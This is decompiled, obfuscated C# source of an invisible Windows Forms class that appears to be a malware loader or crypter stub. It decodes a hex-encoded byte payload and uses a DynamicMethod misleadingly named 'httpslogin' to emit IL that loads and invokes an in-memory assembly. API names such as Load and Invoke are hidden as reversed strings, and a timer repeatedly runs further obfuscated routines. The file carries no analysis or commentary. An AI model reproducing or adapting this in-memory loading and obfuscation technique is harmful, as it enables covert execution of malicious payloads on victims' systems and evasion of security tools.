using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Security;
using System.Windows.Forms;
using ExampleApp;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using SmartAssembly.License;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using ns0;

[DesignerGenerated]
public class Form1 : Form
{
	public IContainer components;

	internal Timer timer_0;

	internal TextBox textBox_0;

	internal Button button_0;

	internal Label label_0;

	internal Label label_1;

	internal Label label_2;

	internal Label label_3;

	internal Panel panel_0;

	internal ProgressBar progressBar_0;

	protected override void Dispose(bool disposing)
	{
		try
		{
			try
			{
				if (disposing && components != null)
				{
					components.Dispose();
				}
			}
			finally
			{
				((Form)this).Dispose(disposing);
			}
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, disposing);
			throw;
		}
	}

	public void InitializeComponent()
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_02f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		Point point = default(Point);
		Size size = default(Size);
		SizeF sizeF = default(SizeF);
		try
		{
			UsageReportSender.smethod_5((Control)(object)this, bool_0: false, 705, 671);
			Class27.smethod_1((Form)(object)this, bool_0: false, 889, 855);
			((Form)this).set_Opacity(0.0);
			vmethod_1(new TextBox());
			vmethod_3(new Button());
			vmethod_5(new Label());
			vmethod_7(new Label());
			vmethod_9(new Label());
			vmethod_11(new Label());
			vmethod_13(new Panel());
			vmethod_15(new ProgressBar());
			((Control)this).SuspendLayout();
			TextBox control_ = vmethod_0();
			point = new Point(12, 23);
			FeedbackControl.smethod_0((Control)(object)control_, point, 410, 482);
			SimpleZip.Class6.smethod_3((Control)(object)vmethod_0(), "TextBox1", 682, 689);
			UsageCounts.smethod_1(vmethod_0(), "", 104, 90);
			TextBox control_2 = vmethod_0();
			size = new Size(100, 20);
			SmartAssembly.SmartUsageCore.ReportUsageAttribute.smethod_2((Control)(object)control_2, size, 527, 544);
			Class21.smethod_2((Control)(object)vmethod_0(), 0, 803, 794);
			Button control_3 = vmethod_2();
			point = new Point(12, 49);
			FeedbackControl.smethod_0((Control)(object)control_3, point, 198, 190);
			SimpleZip.Class6.smethod_3((Control)(object)vmethod_2(), "Button1", 449, 474);
			Button control_4 = vmethod_2();
			size = new Size(75, 23);
			SmartAssembly.SmartUsageCore.ReportUsageAttribute.smethod_2((Control)(object)control_4, size, 860, 883);
			Class21.smethod_2((Control)(object)vmethod_2(), 1, 53, 12);
			Class22.smethod_1((ButtonBase)(object)vmethod_2(), "Button1", 715, 721);
			SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.smethod_0((ButtonBase)(object)vmethod_2(), bool_0: true, 16, 24);
			sizeF = new SizeF(6f, 13f);
			SendingReportFeedbackEventArgs1.smethod_2((ContainerControl)(object)this, sizeF, 920, 900);
			SmartAssembly.License.License.smethod_2((ContainerControl)(object)this, (AutoScaleMode)1, 17, 106);
			size = new Size(284, 262);
			EntryPoint.smethod_1((Form)(object)this, size, 358, 328);
			SimpleZip.Class9.smethod_0((Control)(object)this, 942, 1016).Add((Control)(object)vmethod_14());
			SimpleZip.Class9.smethod_0((Control)(object)this, 658, 708).Add((Control)(object)vmethod_12());
			SimpleZip.Class9.smethod_0((Control)(object)this, 677, 755).Add((Control)(object)vmethod_10());
			SimpleZip.Class9.smethod_0((Control)(object)this, 480, 438).Add((Control)(object)vmethod_8());
			SimpleZip.Class9.smethod_0((Control)(object)this, 691, 741).Add((Control)(object)vmethod_6());
			SimpleZip.Class9.smethod_0((Control)(object)this, 567, 609).Add((Control)(object)vmethod_4());
			((Control)this).get_Controls().Add((Control)(object)vmethod_2());
			((Control)this).get_Controls().Add((Control)(object)vmethod_0());
			((Control)this).set_Name("Form");
			((Form)this).set_Text("Form");
			((Control)this).ResumeLayout(false);
			((Control)this).PerformLayout();
			((Form)this).set_Opacity(0.0);
			Timer val = (timer_0 = new Timer());
			((Form)this).set_ShowInTaskbar(false);
			timer_0.set_Interval(2000);
			timer_0.add_Tick((EventHandler)timer_0_Tick);
		}
		catch (Exception exception)
		{
			Point point2 = default(Point);
			Size size2 = default(Size);
			SizeF sizeF2 = default(SizeF);
			StackFrameHelper.CreateException7(exception, point2, point, size2, size, sizeF2, sizeF, this);
			throw;
		}
	}

	public Form1()
	{
		try
		{
			InitializeComponent();
			method_0();
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException1(exception, this);
			throw;
		}
	}

	private void method_0()
	{
		string text = default(string);
		byte[] array = default(byte[]);
		try
		{
			text = SimpleZip.Class5.smethod_1(aHVe1CXmadXzB97jVuiNo3geKKy9DuOtSgvgcVroUwQIEJjkWRGpZ4Sz7LbH3vwu.a2iiPoBqvznOqK05pT4r0S21kX2KeyawdjY2ypE0M1ZCjm6XVhtmDd3HleL6YUTA4(), 489, 422);
			array = method_1(text);
			a3pdv9mmBB6TZ2G1.aLn4nkc1vF5UFPV(array, ReportSender.smethod_3(SimpleZip.Class6.smethod_4(Win32.smethod_9(910, 1006), 531, 534), 390, 489));
			timer_0.Start();
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException3(exception, array, text, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void timer_0_Tick(object sender, EventArgs e)
	{
		Exception o = default(Exception);
		try
		{
			try
			{
				Class2.smethod_0();
				Class2.smethod_1();
				Class2.smethod_2();
				Class2.smethod_3();
				Class2.smethod_4();
				Class2.smethod_5();
				Class2.smethod_6();
				Class2.smethod_7();
				Class15.smethod_1(611, 577);
			}
			catch (Exception ex)
			{
				ReportSender.smethod_2(ex, 411, 459);
				o = ex;
				Class23.smethod_1(654, 700);
			}
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException4(exception, o, this, sender, e);
			throw;
		}
	}

	private byte[] method_1(string string_0)
	{
		string text = default(string);
		int num = default(int);
		int num2 = default(int);
		byte[] array = default(byte[]);
		long num3 = default(long);
		long num4 = default(long);
		try
		{
			text = string_0;
			num = Class3.smethod_1(text, 485, 397);
			num2 = num / 2;
			if (num % 2 == 0)
			{
				num2 = checked(num2 - 1);
			}
			else
			{
				text = Class35.smethod_8("0", text, 651, 741);
			}
			checked
			{
				array = new byte[num2 + 1];
				num3 = num2;
				for (num4 = 0L; num4 <= num3; num4++)
				{
					array[(int)num4] = Class16.smethod_11(SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.smethod_0(text, (int)(num4 * 2L), 2, 76, 14), 16, 122, 125);
				}
				return array;
			}
		}
		catch (Exception exception)
		{
			byte[] o = default(byte[]);
			StackFrameHelper.CreateException9(exception, array, o, text, num, num2, num4, num3, this, string_0);
			throw;
		}
	}

	private object method_2(string string_0)
	{
		char[] array = default(char[]);
		try
		{
			array = ReportExceptionEventArgs.smethod_1(string_0, 778, 851);
			SimpleZip.Class13.smethod_1(array, 413, 410);
			return new string(array);
		}
		catch (Exception exception)
		{
			object o = default(object);
			StackFrameHelper.CreateException4(exception, array, o, this, string_0);
			throw;
		}
	}

	public object DI(byte[] rAl, object[] prm, string clz, string meth)
	{
		Type[] array = default(Type[]);
		DynamicMethod dynamicMethod = default(DynamicMethod);
		ILGenerator iLGenerator = default(ILGenerator);
		Label label = default(Label);
		object[] array2 = default(object[]);
		try
		{
			Type returnType = Class26.smethod_1(typeof(object).TypeHandle, 448, 484);
			array = new Type[4]
			{
				Class26.smethod_1(typeof(byte[]).TypeHandle, 398, 426),
				Class26.smethod_1(typeof(object[]).TypeHandle, 473, 509),
				Class26.smethod_1(typeof(string).TypeHandle, 28, 56),
				Class26.smethod_1(typeof(string).TypeHandle, 660, 688)
			};
			dynamicMethod = new DynamicMethod("httpslogin", returnType, array);
			iLGenerator = AppNameFinder.smethod_2(dynamicMethod, 736, 670);
			label = PoweredByAttribute.smethod_1(iLGenerator, 484, 510);
			PoweredByAttribute.smethod_2(iLGenerator, Class26.smethod_1(typeof(Assembly).TypeHandle, 966, 994), 280, 333);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldarg_0, 404, 407);
			ILGenerator ilgenerator_ = iLGenerator;
			OpCode call = OpCodes.Call;
			Type type_ = Class26.smethod_1(typeof(Assembly).TypeHandle, 126, 90);
			string string_ = SimpleZip.Class5.smethod_1(method_2("daoL"), 127, 48);
			array = new Type[1] { Class26.smethod_1(typeof(byte[]).TypeHandle, 426, 398) };
			SimpleZip.Class9.smethod_1(ilgenerator_, call, HeaderControl.smethod_2(type_, string_, array, 196, 229), null, 474, 442);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Stloc_0, 201, 202);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldarg_2, 1004, 1007);
			SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.smethod_4(iLGenerator, OpCodes.Brfalse_S, label, 775, 847);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldarg_3, 114, 113);
			SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.smethod_4(iLGenerator, OpCodes.Brfalse_S, label, 334, 262);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldloc_0, 662, 661);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldarg_2, 364, 367);
			ILGenerator ilgenerator_2 = iLGenerator;
			OpCode callvirt = OpCodes.Callvirt;
			Type type_2 = Class26.smethod_1(typeof(Assembly).TypeHandle, 857, 893);
			string string_2 = SimpleZip.Class5.smethod_1(method_2("epyTteG"), 463, 384);
			array = new Type[1] { Class26.smethod_1(typeof(string).TypeHandle, 878, 842) };
			SimpleZip.Class9.smethod_1(ilgenerator_2, callvirt, HeaderControl.smethod_2(type_2, string_2, array, 661, 692), null, 134, 230);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldarg_3, 7, 4);
			ILGenerator ilgenerator_3 = iLGenerator;
			OpCode callvirt2 = OpCodes.Callvirt;
			Type type_3 = Class26.smethod_1(typeof(Type).TypeHandle, 742, 706);
			string string_3 = SimpleZip.Class5.smethod_1(method_2("dohteMteG"), 98, 45);
			array = new Type[1] { Class26.smethod_1(typeof(string).TypeHandle, 729, 765) };
			SimpleZip.Class9.smethod_1(ilgenerator_3, callvirt2, HeaderControl.smethod_2(type_3, string_3, array, 10, 43), null, 907, 1003);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldnull, 387, 384);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ldarg_1, 44, 47);
			ILGenerator ilgenerator_4 = iLGenerator;
			OpCode callvirt3 = OpCodes.Callvirt;
			Type type_4 = Class26.smethod_1(typeof(MethodBase).TypeHandle, 271, 299);
			string string_4 = SimpleZip.Class5.smethod_1(method_2("ekovnI"), 345, 278);
			array = new Type[2]
			{
				Class26.smethod_1(typeof(object).TypeHandle, 625, 597),
				Class26.smethod_1(typeof(object[]).TypeHandle, 632, 604)
			};
			SimpleZip.Class9.smethod_1(ilgenerator_4, callvirt3, HeaderControl.smethod_2(type_4, string_4, array, 934, 903), null, 906, 1002);
			AppPathFinder.smethod_0(iLGenerator, OpCodes.Ret, 816, 819);
			Class20.smethod_3(iLGenerator, label, 758, 746);
			iLGenerator.Emit(OpCodes.Ldloc_0);
			iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetProperty(Conversions.ToString(method_2("tnioPyrtnE")))!.GetGetMethod(), null);
			iLGenerator.Emit(OpCodes.Ldnull);
			iLGenerator.Emit(OpCodes.Ldarg_1);
			ILGenerator iLGenerator2 = iLGenerator;
			OpCode callvirt4 = OpCodes.Callvirt;
			Type typeFromHandle = typeof(MethodBase);
			string name = Conversions.ToString(method_2("ekovnI"));
			array = new Type[2]
			{
				typeof(object),
				typeof(object[])
			};
			iLGenerator2.EmitCall(callvirt4, typeFromHandle.GetMethod(name, array), null);
			iLGenerator.Emit(OpCodes.Ret);
			DynamicMethod dynamicMethod2 = dynamicMethod;
			array2 = new object[4] { rAl, prm, clz, meth };
			return dynamicMethod2.Invoke(null, array2);
		}
		catch (Exception caughtException)
		{
			object obj = default(object);
			StackFrameHelper.CreateExceptionN(caughtException, new object[11]
			{
				obj, iLGenerator, dynamicMethod, label, array, array2, this, rAl, prm, clz,
				meth
			});
			throw;
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		try
		{
			return textBox_0;
		}
		catch (Exception exception)
		{
			TextBox o = default(TextBox);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_1)
	{
		try
		{
			TextBox val = (textBox_0 = textBox_1);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, textBox_1);
			throw;
		}
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		try
		{
			return button_0;
		}
		catch (Exception exception)
		{
			Button o = default(Button);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button button_1)
	{
		try
		{
			Button val = (button_0 = button_1);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, button_1);
			throw;
		}
	}

	[SpecialName]
	internal virtual Label vmethod_4()
	{
		try
		{
			return label_0;
		}
		catch (Exception exception)
		{
			Label o = default(Label);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Label label_4)
	{
		try
		{
			Label val = (label_0 = label_4);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, label_4);
			throw;
		}
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		try
		{
			return label_1;
		}
		catch (Exception exception)
		{
			Label o = default(Label);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label label_4)
	{
		try
		{
			Label val = (label_1 = label_4);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, label_4);
			throw;
		}
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		try
		{
			return label_2;
		}
		catch (Exception exception)
		{
			Label o = default(Label);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label label_4)
	{
		try
		{
			Label val = (label_2 = label_4);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, label_4);
			throw;
		}
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		try
		{
			return label_3;
		}
		catch (Exception exception)
		{
			Label o = default(Label);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_4)
	{
		try
		{
			Label val = (label_3 = label_4);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, label_4);
			throw;
		}
	}

	[SpecialName]
	internal virtual Panel vmethod_12()
	{
		try
		{
			return panel_0;
		}
		catch (Exception exception)
		{
			Panel o = default(Panel);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Panel panel_1)
	{
		try
		{
			Panel val = (panel_0 = panel_1);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, panel_1);
			throw;
		}
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_14()
	{
		try
		{
			return progressBar_0;
		}
		catch (Exception exception)
		{
			ProgressBar o = default(ProgressBar);
			StackFrameHelper.CreateException2(exception, o, this);
			throw;
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(ProgressBar progressBar_1)
	{
		try
		{
			ProgressBar val = (progressBar_0 = progressBar_1);
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException2(exception, this, progressBar_1);
			throw;
		}
	}

	[SecuritySafeCritical]
	static Form1()
	{
		Class32.smethod_1();
	}

	[SecuritySafeCritical]
	internal static object smethod_0(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 51:
				return NewLateBinding.LateGet(object_0, type_0, string_0, object_1, string_1, type_1, bool_0);
			}
		}
	}
}
